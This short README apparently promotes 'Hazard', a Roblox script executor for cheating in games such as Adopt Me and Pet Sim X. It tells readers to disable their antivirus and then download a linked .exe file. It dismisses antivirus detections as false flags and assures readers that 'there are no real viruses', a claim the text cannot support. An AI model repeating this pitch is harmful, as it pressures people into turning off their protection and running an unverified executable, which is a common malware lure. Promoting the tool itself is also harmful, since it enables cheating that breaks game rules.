Hello! Welcome to Hazard!<br>
I created this executor using Visual Studio and WeAreDevs's and Krnl's API.<br>
It works flawlessly and it can execute most scripts, it supports games such as Adopt Me, MM2, Pet Sim X, and more!

Since this is a Roblox exploit, it gets falsely flagged as a virus due to the fact that it is an exploit. There are no real viruses in my exploit, so there is nothing to worry about. After you disable your antivirus, all you need to do is download it by clicking [this](https://github.com/vex8277/hazard/releases/download/v1.0.0/hazard-executor.exe) or going to the releases tab and downloading from there
